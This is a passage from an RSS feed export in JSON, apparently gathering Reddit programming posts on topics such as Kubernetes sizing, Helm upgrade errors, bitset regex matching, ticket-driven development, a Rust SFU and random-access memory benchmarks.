</p>","contentLength":480,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Give more compute power to the control plane or node workers?","url":"https://www.reddit.com/r/kubernetes/comments/1lliugl/give_more_compute_power_to_the_control_plane_or/","date":1750991869,"author":"/u/Developer_Kid","guid":172675,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Hi im starting on kubernetes and i created 3 machines on AWS to study. 2 of this machines are for node workers/pods and one is the control plane. All the three are 2 CPU 4 Memory. By default is better to give more power to the workers or to the control plane/master? </p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Developer_Kid\"> /u/Developer_Kid </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1lliugl/give_more_compute_power_to_the_control_plane_or/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1lliugl/give_more_compute_power_to_the_control_plane_or/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Bitsets match regular expressions, compactly","url":"https://pvk.ca/Blog/2013/06/23/bitsets-match-regular-expressions/","date":1750989989,"author":"/u/ketralnis","guid":174013,"unread":true,"content":"<p>This post describes how graph and automata theory can help compile a\nregular expression like “ab(cd|e)*fg” into the following\nasymptotically (linear-time) and practically (around 8\ncycles/character on my E5-4617) efficient machine code.  The technique\nis easily amenable to SSE or AVX-level vectorisation, and doesn’t rely\non complicated bit slicing tricks nor on scanning multiple streams in\nparallel.</p><p>The\n<a href=\"https://en.wikipedia.org/wiki/Bitap_algorithm\">canonical bitap algorithm</a>\nmatches literal strings, e.g. “abad”.  Like other bitap algorithms, it\nexploits the fact that, given a bitset representation of states, it’s\neasy to implement transfer functions of the form “if state \\( i \\) was\npreviously active and we just consumed character \\( c \\), state \\(\ni+1 \\) is now active”.  It suffices to shift the bitset\nrepresentation of the set of active states by 1, and to mask out\ntransitions that are forbidden by the character that was just\nconsumed.</p><p>For example, when matching the literal string “abad”, a state is\nassociated with each position in the pattern.  0 is the initial state,\n1 is the state when we’ve matched the first ‘a’, 2 after we’ve also\nmatched ‘b’, 3 after the second ‘a’, and 4 after ‘d’, the final\ncharacter, has been matched.  Transposing this information gives us\nthe information we really need: ‘a’ allows a transition from 0 to 1\nand from 2 to 3, ‘b’ a transition from 1 to 2, and ‘d’ from 3 to 4.</p><p>A trivial state machine is probably clearer.</p><p>The initial state is in grey, the accept state is a double circle, and\ntransitions are labelled with the character they accept.</p><p>Finding the substring “abad” in a long string thus reduces to a bunch\nof bitwise operations.  At each step, we OR bit 0 in the set of\nstates: we’re always looking for the beginning of a new match.  Then,\nwe consume a character.  If it’s ‘a’, the mask is 0b01010; if it’s\n‘b’, mask is 0b00100; if it’s ‘d’, mask is 0b10000; otherwise, its\nmask is 0.  Then, we shift the set of state left by 1 bit, and AND\nwith mask.  The effect is that bit 1 is set iff mask has bit 1 set\n(and that only happens if the character is ‘a’), and bit 0 was\npreviously set (… which is always the case), bit 2 is set iff mask has\nbit 2 set (i.e. we consumed a ‘b’) and bit 1 was previously set, etc.</p><p>We declare victory whenever state 4 is reached, after a simple bit\ntest.</p><p>It’s pretty clear that this idea can be extended to wildcards or even\ncharacter classes: multiple characters can have the same bit set to 1\nin their mask.  Large alphabets are also straightforward to handle:\nthe mapping from character to mask can be any associative dictionary,\ne.g. a perfect hash table (wildcards and inverted character classes\nthen work by modifying the default mask value).  This works not only\nwith strings, but with any sequence of objects, as long as we can\neasily map objects to attributes, and attributes to masks.  Some\nthinking shows it’s even possible to handle the repetition operator\n“+”: it’s simply a conditional transition from state \\( i \\) to\nstate \\( i \\).</p><p>What I find amazing is that the technique extends naturally to\narbitrary regular expressions (or nondeterministic finite automata).</p><h2>Shift and mask for regular expressions</h2><p><a href=\"http://neil.fraser.name/software/diff_match_patch/bitap.ps\">Fast Text Searching With Errors</a>\nby Sun Wu and Udi Manber is a treasure trove of clever ideas to\ncompile pattern matching, a symbolic task, into simple bitwise\noperations.  For regular expressions, the key insight is that the set\nof states can be represented with a bitset such that the transition\ntable for the NFA’s states can be factored into a simple data-dependent\npart followed by \\( \\epsilon \\)-transitions that are the same,\nregardless of the character consumed.  Even better: the NFA’s state\ncan be numbered so that each character transition is from state \\( i\n\\) to \\( i+1 \\), and such a numbering falls naturally from the\nobvious way to translate regular expression ASTs into NFAs.</p><p>For the initial example “ab(cd|e)*fg”, the AST looks like a node to\nmatch ‘a’, succeeded by a node to match ‘b’, then a repetition node\ninto either “cd”, “e” or \\( \\epsilon \\), and the repetition node is\nsucceeded by “fg” (and, finally, accept).  Again, a drawing is much\nclearer!</p><p>Circles correspond to character-matching states, the square to a\nrepetition node, the diamond to a choice node, and the pointy boxes to\ndummy states.  The final accept state is, again, a double circle.\n\\( \\epsilon \\)-transitions are marked in blue, and regular\ntransitions are labelled with the character they consume.</p><p>The nodes are numbered according to a straight depth-first ordering in\nwhich children are traversed before the successor.  As promised,\ncharacter transitions are all from \\( i \\) to \\( i+1 \\), e.g. 0 to\n1, 1 to 2, 6 to 7, … This is a simple consequence of the fact that\ncharacter-matching nodes have no children and a single successor.</p><p>This numbering is criminally wasteful.  States 3, 6 and 10 serves no\npurpose, except forwarding \\( \\epsilon \\) transitions to other\nstates.  The size of the state machine matters because bitwise\noperations become less efficient when values larger than a machine\nword must be manipulated.  Using fewer states means that larger\nregular expressions will be executed more quickly.</p><p>Eliminating them and sliding the numbers back yields the something\nequivalent to the more reasonable 11-state machine shown in Wu and\nManber (Figure 3 on page 10).  Simply not assigning numbers to states\nthat don’t match characters and don’t follow character states suffices\nto obtain such decent numberings.</p><p>Some more thinking shows we can do better, and shave three more states.\nState 2 could directly match against character ‘e’, instead of only\nforwarding into state 3; what is currently state 4 could match against\ncharacter ‘c’, instead of only forwarding into state 8, then 2 and\nthen 5 (which itself matches against ‘c’); and similarly for state 7\ninto state 8.  The result wastes not a single state: each state is\nused to match against a character, except for the accept state.\nInterestingly, the \\( \\epsilon \\) transitions are also more regular:\nthey form a complete graph between states 2, 3 and 5.</p><p>It’s possible to use fewer states than the naïve translation, and it’s\nuseful to do so.  How can a program find compact numberings?</p><p>The natural impulse for functional programmers (particularly\nfunctional compiler writers ;) is probably to start matching patterns\nto iteratively reduce the graph.  If they’ve had bad experience with\nslow fixpoint computations, there might also be some attempts at\nrecognising patterns before even emitting them.</p><p>This certainly describes my first couple stabs; they were either\nmediocre or wrong (sometimes both), and certainly not easy to reason\nabout.  It took me a while to heed age-old advice about crossing the\nstreet and compacting state machines.</p><p>Really, what we’re trying to do when compacting the state machine is\nto determine equivalence classes of states: sets of states that can be\ntracked as an atomic unit.  With rewrite rules, we start by assuming\nthat all the states are distinct, and gradually merge them.  In other\nwords, we’re computing a fixed point starting from the initial\nhypothesis that nothing is equivalent.</p><p>Problem is,\n<a href=\"https://pvk.ca/Blog/2012/02/19/fixed-points-and-strike-mandates/\">we should be doing the opposite</a>!\nIf we assume that all the states can be tracked as a single unit, and\nbreak equivalence classes up in as we’re proven wrong, we’ll get\nmaximal equivalence classes (and thus as few classes as possible).</p><p>To achieve this, I start with the naïvely numbered state machine.\nI’ll refer to the start state and character states as “interesting\nsources”, and to the accept state and character states as “interesting\ndestinations”.  Ideally, we’d be able to eliminate everything but\ninteresting destinations: the start state can be preprocessed away by\ninstead working with all the interesting destinations transitively\nreachable from the start state via \\( \\epsilon \\) transitions\n(including itself if applicable).</p><p>The idea is that two states are equivalent iff they are always active\nafter the same set of interesting sources.  For example, after the\nstart state 0, only state 1 is active (assuming that the character\nmatches).  After state 1, however, all of 2, 3, 4, 6, 7, 10 and 11 are\nactive.  We have the same set after states 4 and 8.  Finally, only one\nstate is alive after each of 11 and 12.</p><p>Intersecting the equivalence relations thus defined give a few trivial\nequivalence classes (0, 1, 5, 8, 9, 12, 13), and one huge equivalence\nclass comprised of {2,3,4,6,7,10,11} made of all the states that are\nactive exactly after 1, 5 and 9.  For simplicity’s sake, I’ll refer to\nthat equivalence class as K.  After contraction, we find this smaller\nstate graph.</p><p>We can renumber this reasonably to obey the restriction on character\nedges: K is split into three nodes (one for each outgoing\ncharacter-consuming edge) numbered 2, 4 and 7.</p><p>We could do even better if 5 and 9 (3 and 6 above) in the earlier\ncontracted graph were also in equivalence class K: they only exist to\nforward back into K!  I suggest to achieve that with a simple\npost-processing pass.</p><p>Equivalence classes are found by find determining after which\ninteresting node each state is live.  States that are live after\nexactly the same sets of interesting nodes define an equivalence\nclass.  I’ll denote this map from state to transitive interesting\npredecessors \\( pred(state) \\).</p><p>We can coarsen the relationship a bit, to obtain \\(\npred\\sp{\\prime}(state) \\).  For interesting destinations, \\(\npred\\sp{\\prime} = pred \\).  For other nodes,\n\\(pred\\sp{\\prime}(state) = \\cap\\sb{s\\in reachable(state)}pred(s)\\), where\n\\(reachable(state)\\) is the set of interesting destinations reachable via\n\\( \\epsilon \\) transitions from \\(state\\).  This widening makes\nsense because \\(state\\) isn’t interesting (we never want to know\nwhether it is active, only whether its reachable set is), so it\ndoesn’t matter if \\(state\\) is active when it shouldn’t, as long as\nits destinations would all be active anyway.</p><p>This is how we get the final set of equivalence classes.</p><p>We’re left with a directed multigraph, and we’d like to label nodes\nsuch that each outgoing edge goes from its own label \\( i \\) to \\(\ni+1 \\).  We wish to do so while using the fewest number of labels.\nI’m pretty sure we can reduce something NP-Hard like the minimum path\ncover problem to this problem, but we can still attempt a simple\nheuristic.</p><p>If there were an Eulerian directed path in the multigraph, that path\nwould give a minimal set of labels: simply label the origin of each\narc with its rank in the path.  An easy way to generate an Eulerian\ncircuit, if there is one, is to simply keep following any unvisited\noutgoing arc.  If we’re stuck in a dead end, restart from any vertex\nthat has been visited and still has unvisited outgoing arcs.</p><p>There’s a fair amount of underspecification there.  Whenever many\nequivalence classes could be chosen, I choose the one that corresponds\nto the lexicographically minimal (sorted) set of regexp states (with\nrespect to their depth-first numbering).  This has the effect of\nmostly following the depth-first traversal, which isn’t  bad.\nThere’s also no guarantee that there exists an Eulerian path.  If\nwe’re completely stuck, I start another Eulerian path, again starting\nfrom the lexicographically minimal equivalence class with an unvisited\noutgoing edge.</p><p>Finally, once the equivalence states are labelled, both character and\n\\( \\epsilon \\) transitions are re-expressed in terms of these\nlabels.  The result is a nice 8-state machine.</p><p>This only covers the abstract stuff. There’s a\n<a href=\"https://github.com/pkhuong/bitap-regexp\">CL code dump</a> on github.\nYou’re probably looking for  and\n; the rest are failed experiments.</p><p>Once a small labeling is found, generating a matcher is really\nstraightforward.  The data-dependent masks are just a dictionary\nlookup (probably in a vector or in a perfect hash table), a shift and\na mask.</p><p>Traditionally, epsilon transitions have been implemented with a few\ntable lookups.  For example, the input state can be cut up in bytes;\neach byte maps to a word in a different lookup table, and all the\nbytes are ORed together.  The tables can be pretty huge (\nlookup tables of 256 state values each), and the process can be slow\nfor large states (bitsets).  This makes it even more important to\nreduce the size of the state machine.</p><p>When runtime compilation is easy, it seems to make sense to instead\ngenerate a small number of test and conditional moves… even more so if\nSIMD is used to handle larger state sets.  A couple branch-free\ninstructions to avoid some uncorrelated accesses to LUTs looks like a\nreasonable tradeoff, and, if SIMD is involved, the lookups would\nprobably cause some slow cross-pipeline ping-ponging.</p><p>There’s another interesting low-level trick.  It’s possible to handle\nlarge state sets without multi-word shifts: simply insert padding\nstates (linked via \\( \\epsilon \\) transitions) to avoid character\ntransitions that straddle word boundaries.</p><p>There’s a lot more depth to this bitap for regexp matching thing.  For\nexample, bitap regular expressions can be adapted to fuzzy matchings\n(up to a maximum edit distance), by counting the edit distance in\nunary and working with one bitset for each edit distance value.  More\nimportant in practice, the approach described so far only handles\nrecognising a regular language; parsing into capture groups and\nselecting the correct match is a complex issue about which <a href=\"http://swtch.com/~rsc/regexp/\">Russ Cox has a lot to say</a>.</p><p>What I find interesting is that running the NFA backward from accept\nstates gives us a forward oracle: we can then tell whether a certain\nstate at a given location in the string will eventually reach an\naccept state.  Guiding an otherwise deterministic parsing process with\nsuch a regular language oracle clearly suffices to implement capture\ngroups (all non-deterministic choices become deterministic), but it\nalso looks like it would be possible to parse useful non-regular\nlanguages without backtracking or overly onerous memoisation.</p>","contentLength":14098,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lli8gx/bitsets_match_regular_expressions_compactly/"},{"title":"[R] EMNLP 2025: reply to reviewers disabled","url":"https://www.reddit.com/r/MachineLearning/comments/1llhl65/r_emnlp_2025_reply_to_reviewers_disabled/","date":1750988045,"author":"/u/South-Conference-395","guid":173851,"unread":true,"content":"<p>Hi all, I would like to check whether anyone is facing same issue as myself. It seems that I cannot add an official comment in my submission. I can currently see only the author-editor confidential comment option. Has anyone managed to submit their replies?</p>","contentLength":257,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"getopt_long.go v1.1.2","url":"https://github.com/BChristieDev/getopt_long.go","date":1750987115,"author":"/u/BChristieDev","guid":172651,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1llha6m/getopt_longgo_v112/"},{"title":"Stuck in a Helm Upgrade Loop: v2beta2 HPA error","url":"https://www.reddit.com/r/kubernetes/comments/1llgbuv/stuck_in_a_helm_upgrade_loop_v2beta2_hpa_error/","date":1750984280,"author":"/u/envy0ps","guid":172605,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Hey folks,</p> <p>I&#39;m in the middle of a really strange Helm issue and I&#39;m hoping to get some insight from the community. I&#39;m trying to upgrade the <code>ingress-nginx</code> Helm chart on a Kubernetes cluster. My cluster&#39;s version v1.30. I got an error like this:</p> <blockquote> <p>resource mapping not found for name: &quot;ingress-nginx-controller&quot; namespace: &quot;ingress-nginx&quot; from &quot;&quot;: no matches for kind &quot;HorizontalPodAutoscaler&quot; in version &quot;autoscaling/v2beta2&quot;</p> </blockquote> <p>Then i run <strong>helm mapkubeapis</strong> command. But it didn&#39;t work.</p> <p>Any rollback and upgrade didn&#39;t work because my helm release contains &quot;autoscaling/v2beta2&quot; on hpa.</p> <p>I don&#39;t want to uninstall my resources. </p> <ol> <li><p>Anyone seen Helm get &quot;haunted&quot; by a non-existent resource before?</p></li> <li><p>Is there a way to edit Helm&#39;s release history (Secret) to remove the bad manifest?</p></li> </ol> <p>Any insights would be appreciated.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/envy0ps\"> /u/envy0ps </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1llgbuv/stuck_in_a_helm_upgrade_loop_v2beta2_hpa_error/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1llgbuv/stuck_in_a_helm_upgrade_loop_v2beta2_hpa_error/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Ticket-Driven Development: The Fastest Way to Go Nowhere","url":"https://thecynical.dev/posts/ticket-driven-development/","date":1750982631,"author":"/u/self","guid":173466,"unread":true,"content":"<p>Let me guess how your day started.</p><p>You opened your laptop, fired up the sprint board, and grabbed the next ticket in the “Ready” column. Maybe it was a small feature. Maybe a bug. Either way, you didn’t write it, you didn’t scope it, and you definitely didn’t question it. Because that’s not how it works here.</p><p>We are  now.Thinking is out. Throughput is in.</p><figure><img loading=\"lazy\" src=\"https://thecynical.dev/images/ticket-conveyor.webp\" alt=\"A flat-style digital illustration of a conveyor belt in a dull, grey office. Each item on the belt is a JIRA ticket, and a tired developer mechanically stamps them 'Done' without looking up.\"><figcaption><p>Tickets are moving. Morale is not.</p></figcaption></figure><h2>The Anti-Pattern of “Just Do the Ticket”<a hidden=\"\" aria-hidden=\"true\" href=\"https://thecynical.dev/posts/ticket-driven-development/#the-anti-pattern-of-just-do-the-ticket\">#</a></h2><p>At first, it looks like productivity.Nobody’s blocked. Work is moving. Standups are mercifully short.</p><p>But look closer and it’s more like a conveyor belt at a factory that forgot what it’s building. Features ship, bugs creep back in, and the codebase becomes an archaeological dig of short-term fixes and forgotten context.</p><p>The devs?They’ve stopped thinking beyond the task in front of them. Because every time someone does, they get told:</p><blockquote><p>“Yeah, good thought, but just stick to the ticket for now.”</p></blockquote><p>Translation: </p><h2>How We Train Developers to Stop Thinking<a hidden=\"\" aria-hidden=\"true\" href=\"https://thecynical.dev/posts/ticket-driven-development/#how-we-train-developers-to-stop-thinking\">#</a></h2><ul><li>Ask  the feature matters? You’re overstepping.</li><li>Suggest a refactor while in the code? Not in scope.</li><li>Improve naming, extract duplication, or add a helpful comment? That’s gold plating now.</li></ul><p>We say we hire smart developers, but then reward the ones who colour inside the lines. Every sprint becomes a speedrun through predefined cards. The only skill that improves is JIRA fluency.</p><p>Eventually, even the good devs stop caring.They stop asking questions.<p>They stop solving problems.</p></p><p>And that’s when the real rot sets in.</p><h2>Velocity Is Not Progress<a hidden=\"\" aria-hidden=\"true\" href=\"https://thecynical.dev/posts/ticket-driven-development/#velocity-is-not-progress\">#</a></h2><p>You can burn down 30 points a week and still be going backwards.</p><ul><li>That clever workaround? Now a landmine.</li><li>That tech debt? Still accruing interest.</li><li>That design decision? Never re-evaluated.</li></ul><p>Ticket-Driven Development optimizes for , not . It mistakes activity for effectiveness. It gets things done—but not necessarily the  things, or in a way that can survive the next product pivot.</p><p>And when things inevitably break?More tickets.</p><h2>Spotting a Team Trapped in Ticket Mode<a hidden=\"\" aria-hidden=\"true\" href=\"https://thecynical.dev/posts/ticket-driven-development/#spotting-a-team-trapped-in-ticket-mode\">#</a></h2><ul><li>Nobody knows why you’re building what you’re building — just that it’s due Friday.</li><li>PRs are “green” but never discussed.</li><li>Tech debt tasks go untouched until a fire breaks out.</li><li>Every improvement needs a separate ticket, separate estimate, separate approval.</li><li>Engineers treat code like it belongs to someone else; Which, functionally, it does.</li></ul><p>The most damning sign?Nobody’s proud of the code anymore. It’s just a job.</p><h2>Pushing Back Without Burning Down the Board<a hidden=\"\" aria-hidden=\"true\" href=\"https://thecynical.dev/posts/ticket-driven-development/#pushing-back-without-burning-down-the-board\">#</a></h2><p>You don’t need a process revolution to fix this. You need .</p><p>Here’s what that looks like:</p><ul><li>Leave the code a little better than you found it — even if no one asked you to.</li><li>Pair up occasionally, not because it’s mandated, but because it helps.</li><li>Ask why. Even if you already know the answer. Especially then.</li><li>Write the extra comment. Rename the method. Delete the dead file.</li><li>Treat the ticket as a boundary, not a blindfold.</li></ul><p>Because the real job isn’t closing tickets it’s building systems that work.</p><h2>The Work That’s Worth Doing<a hidden=\"\" aria-hidden=\"true\" href=\"https://thecynical.dev/posts/ticket-driven-development/#the-work-thats-worth-doing\">#</a></h2><p>When I work with teams, I’m not adding frameworks, ceremonies, or new ways to track the same pain. I help strip away the noise so developers can actually think again.</p><p>We reconnect teams with flow, autonomy, and the pride of shipping work that . Not just work that moves.</p><p>Because in the end, <strong>delivery is not about going faster. It’s about going somewhere on purpose.</strong></p>","contentLength":3373,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1llfrbf/ticketdriven_development_the_fastest_way_to_go/"},{"title":"Building a Real-Time SFU in Rust with ASCII Video Rendering","url":"https://youtube.com/watch?v=KoLOzA3hA3U&amp;si=vrzjlXFOK6Kqa8Pa","date":1750979249,"author":"/u/Ok-Medicine8128","guid":174012,"unread":true,"content":"<p>I've been exploring real-time communication systems and recently implemented a minimal Selective Forwarding Unit (SFU) in Rust. The system uses tokio for asynchronous networking and opencv for video capture, with video frames forwarded over UDP to minimize latency. Instead of a GUI, the client renders incoming video as ASCII in the terminal using crossterm.</p><p><strong>Some implementation details:</strong></p><ul><li>: One server, many clients. The server relays video streams rather than mixing them.</li><li>: TCP handles signaling (room join, user listing, etc), and UDP carries video data.</li><li><strong>Real-time ASCII rendering</strong>: Frames are downsampled and encoded as characters, with optional color output.</li><li>: No GUI or browser dependencies; fully terminal-based.</li></ul><p>This was also an experiment in terminal-based UIs and low-level media transport. If anyone’s worked on similar systems or has suggestions for optimizing frame throughput or improving terminal rendering performance, I’d be interested in hearing your thoughts.</p>","contentLength":975,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lleisa/building_a_realtime_sfu_in_rust_with_ascii_video/"},{"title":"Reflecting JSON into C++ Objects at compile time","url":"https://brevzin.github.io/c++/2025/06/26/json-reflection/","date":1750978003,"author":"/u/ketralnis","guid":173816,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lle1ra/reflecting_json_into_c_objects_at_compile_time/"},{"title":"How much slower is random access, really?","url":"https://samestep.com/blog/random-access/","date":1750977694,"author":"/u/ketralnis","guid":173669,"unread":true,"content":"<p>\n          You may know that, because your computer has different caches (L1, L2,\n          L3...), and memory operations operate on cache lines of about 64 bytes\n          each, you should write programs that exhibit\n          <a href=\"https://en.wikipedia.org/wiki/Locality_of_reference\">locality</a>\n          to get maximum performance.\n        </p><div><svg viewBox=\"0 0 300 400\" height=\"400\"></svg></div><p>(Disk not shown, of course.)</p><p>\n          But  do you understand this idea? For\n          instance, let's say you have an array of floating-point numbers, and\n          an array of all the indices of the first array. You have a program\n          that adds up the numbers from the first array in the order given by\n          the second array. So, for this example, we'd add\n           in that order:\n        </p><p>\n          Let's just consider the two cases where the indices are in\n           or in\n          . Before I wrote this post, I couldn't\n          answer any of the following questions:\n        </p><ol><li>\n            How big of an array do you need before you see a difference in\n            performance between the two orderings?\n          </li><li>\n            How much time does the first-to-last ordering take per element, on\n            average?\n          </li><li>\n            How much slower is random order than first-to-last order for arrays\n            that fit in RAM?\n          </li><li>\n            How much slower is random order than first-to-last order for arrays\n            that don't fit in RAM?\n          </li><li>\n            To construct these shuffled index arrays for the random ordering, is\n            standard Fisher-Yates sufficient?\n          </li><li>\n            How much slower is first-to-last order for arrays that don't fit in\n            RAM, when using memory-mapped files?\n          </li><li>Are memory-mapped files as fast as you can get?</li></ol><p>\n          If you already know the answers to all these questions, sweet!\n          Otherwise, make your guesses and check them when you reach the bottom\n          of this post :)\n        </p><p>\n          Because the indices are just stored in an array, they should use the\n           for both first-to-last order and\n          random order, we've chosen the precisions for our floating-point and\n          integer data types. That means the performance should be entirely\n          determined by  behavior in the CPU based on the data\n          we're using, along with other dynamic behavior by the operating system\n          like memory paging and swap space.\n        </p><p>\n          Now we need to generate some random data. For the floating-point\n          numbers we can just use a\n          <a href=\"https://en.wikipedia.org/wiki/Normal_distribution\">normal distribution</a>, and for the integer indices we can just take the list of integers\n          up to the length of our array, and shuffle it to get a random\n          permutation via\n          <a href=\"https://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle\">Fisher-Yates</a>, a standard algorithm that shuffles the data in a single pass.\n        </p><p>\n          Or rather, that's what I thought at first. Small spoiler: further down\n          we're going to do some experiments with arrays too big to fit in\n          memory, and for those, Fisher-Yates turned out to be way too slow. So\n          instead I implemented a\n          <a href=\"https://blog.janestreet.com/how-to-shuffle-a-big-dataset/\">two-pass shuffle</a>\n          which first partitions the array into chunks that are about a gigabyte\n          each.\n        </p><p>\n          Next we just need to use this to make a bunch of files with data of\n          different sizes. We'll just do all the powers of two up whatever fits\n          comfortably on our SSD.\n        </p><p>\n          Alrighty, now that we have all these files, let's run our code on\n          them!\n        </p><p>I ran these experiments on two different machines:</p><ul><li>\n            A 2020 MacBook Pro with M1 chip, 16 GiB of RAM, and a 1 TB SSD.\n          </li><li>\n            A Linux desktop with an AMD Ryzen 5 3600X, 24 GiB of Corsair\n            Vengeance LPX DDR4 3000MHz DRAM, and a Western Digital 1 TB 3D NAND\n            SATA SSD.\n          </li></ul><p>\n          For each data point (given a choice of floating-point type and integer\n          type, and an array size), I ran the summation at least ten times (up\n          to a hundred times for some of the smaller arrays), dropped the first\n          two (while caches were still warming up), and computed the mean of the\n          remaining times.\n        </p><div><div><p>\n              Here are the\n               and\n               results with\n              <strong>single-precision floating-point</strong> and\n               (use the toggles to select\n              other configurations):\n            </p></div><div><p>\n              Here are the\n               and\n               results with\n              <strong>single-precision floating-point</strong> and\n               (use the toggles to select\n              other configurations):\n            </p></div><div><p>\n              Here are the\n               and\n               results with\n              <strong>double-precision floating-point</strong> and\n               (use the toggles to select\n              other configurations):\n            </p></div><div><p>\n              Here are the\n               and\n               results with\n              <strong>double-precision floating-point</strong> and\n               (use the toggles to select\n              other configurations):\n            </p></div></div><div><div><div><svg viewBox=\"0 0 300 250\" height=\"250\"></svg></div></div><div><div><svg viewBox=\"0 0 300 250\" height=\"250\"></svg></div></div><div><div><svg viewBox=\"0 0 300 250\" height=\"250\"></svg></div></div><div><div><svg viewBox=\"0 0 300 250\" height=\"250\"></svg></div></div></div><p>\n          Note that both the\n          -axis and the\n          -axis are on a log scale. As you can see, it levels out at about a\n          nanosecond per element, until the array of floating-point numbers\n          becomes too large to fit in the system-level cache (SLC), which is 8\n          MiB. Then first-to-last order stays the same, but random order goes up\n          to about four nanoseconds. Finally, when the arrays become too large\n          to fit in RAM, both times shoot up; more on that later.\n        </p><div><div><p>\n              Here are the results with\n              <strong>single-precision floating-point</strong> and\n              :\n            </p></div><div><p>\n              Here are the results with\n              <strong>single-precision floating-point</strong> and\n              :\n            </p></div><div><p>\n              Here are the results with\n              <strong>double-precision floating-point</strong> and\n              :\n            </p></div><div><p>\n              Here are the results with\n              <strong>double-precision floating-point</strong> and\n              :\n            </p></div></div><div><div><div><svg viewBox=\"0 0 300 250\" height=\"250\"></svg></div></div><div><div><svg viewBox=\"0 0 300 250\" height=\"250\"></svg></div></div><div><div><svg viewBox=\"0 0 300 250\" height=\"250\"></svg></div></div><div><div><svg viewBox=\"0 0 300 250\" height=\"250\"></svg></div></div></div><p>\n          A bit noisier data for those smaller arrays! Looks like first-to-last\n          order is actually only about half a nanosecond per element on this\n          CPU. But even though this L3 cache is 32 MiB, random order starts to\n          become slower when the floating-point array is bigger than 4 MiB; not\n          sure why. The ratio here is starker here, ranging from four to about\n          eight nanoseconds per element after divergence from the first-to-last\n          curve.\n        </p><p>\n          Just like the MacBook, there's a huge spike when there's too much to\n          fit everything in RAM, but the interesting difference here is that\n          random-order performance starts to degrade sharply even before\n          reaching that point, while first-to-last order stays relatively\n          stable. Even though I have 24 GiB of RAM, floating-point arrays over a\n          gigabyte in size start to reach twenty or thirty nanoseconds per\n          element.\n        </p><p>\n          After running the above, I wasn't sure whether the spike in the\n          right-hand part of the graph was just because I was trying to read the\n           file into memory before doing any work. Here are some\n          results using\n          <a href=\"https://en.wikipedia.org/wiki/Memory-mapped_file\">memory-mapped files</a>\n          instead. To my disappointment, though, the results look more or less\n          the same (although at least this time it didn't freeze up my computer\n          on the really big arrays).\n        </p><div><div><p>\n              Here are the results with\n              <strong>single-precision floating-point</strong> and\n              :\n            </p></div><div><p>\n              Here are the results with\n              <strong>single-precision floating-point</strong> and\n              :\n            </p></div><div><p>\n              Here are the results with\n              <strong>double-precision floating-point</strong> and\n              :\n            </p></div><div><p>\n              Here are the results with\n              <strong>double-precision floating-point</strong> and\n              :\n            </p></div></div><div><div><div><svg viewBox=\"0 0 300 250\" height=\"250\"></svg></div></div><div><div><svg viewBox=\"0 0 300 250\" height=\"250\"></svg></div></div><div><div><svg viewBox=\"0 0 300 250\" height=\"250\"></svg></div></div><div><div><svg viewBox=\"0 0 300 250\" height=\"250\"></svg></div></div></div><p>\n          Looks pretty much the same as before, but this time we were able to\n          run it on bigger inputs. As you can see, for large enough arrays,\n          shuffling the indices seems to have basically no effect on\n          performance; both approaches end up taking over twenty nanoseconds per\n          element on average. I wonder if this is a macOS-specific phenomenon.\n        </p><div><div><p>\n              Here are the results with\n              <strong>single-precision floating-point</strong> and\n              :\n            </p></div><div><p>\n              Here are the results with\n              <strong>single-precision floating-point</strong> and\n              :\n            </p></div><div><p>\n              Here are the results with\n              <strong>double-precision floating-point</strong> and\n              :\n            </p></div><div><p>\n              Here are the results with\n              <strong>double-precision floating-point</strong> and\n              :\n            </p></div></div><div><div><div><svg viewBox=\"0 0 300 250\" height=\"250\"></svg></div></div><div><div><svg viewBox=\"0 0 300 250\" height=\"250\"></svg></div></div><div><div><svg viewBox=\"0 0 300 250\" height=\"250\"></svg></div></div><div><div><svg viewBox=\"0 0 300 250\" height=\"250\"></svg></div></div></div><p>\n          Not much new to see here. Still, it is interesting that performance\n          for random order seems to degrade much more gradually than performance\n          for first-to-last order; the latter pretty look almost like a step\n          function after reaching a billion elements.\n        </p><p>\n          Just one last experiment, I swear! I was still curious how much of the\n          performance cliff for large arrays was simply due to memory bandwidth\n          versus SSD bandwidth, and how much was due to how the operating system\n          handles memory-mapped files. So I tried a separate implementation that\n          just reads the file of floating-point numbers a chunk at a time, sums\n          up that chunk, then moves to the next chunk.\n        </p><p>\n          Note that this is not an apples-to-apples comparison like the above\n          experiments were, since it uses a completely different implementation\n          to compute the sum. That's why I put it here in its own section.\n        </p><div><div><p>Here are the  results.</p></div><div><p>Here are the  results.</p></div></div><div><div><div><svg viewBox=\"0 0 300 250\" height=\"250\"></svg></div></div><div><div><svg viewBox=\"0 0 300 250\" height=\"250\"></svg></div></div></div><p>\n          This pretty much confirms my suspicion: it looks like memory-mapping\n          was just not being very smart. Even if you doubled these times, you'd\n          still only end up with a few nanoseconds per element on average, which\n          is much faster than the over twenty nanoseconds per element we were\n          seeing earlier for larger arrays.\n        </p><div><div><p>Here are the  results.</p></div><div><p>Here are the  results.</p></div></div><div><div><div><svg viewBox=\"0 0 300 250\" height=\"250\"></svg></div></div><div><div><svg viewBox=\"0 0 300 250\" height=\"250\"></svg></div></div></div><p>\n          A very different story on 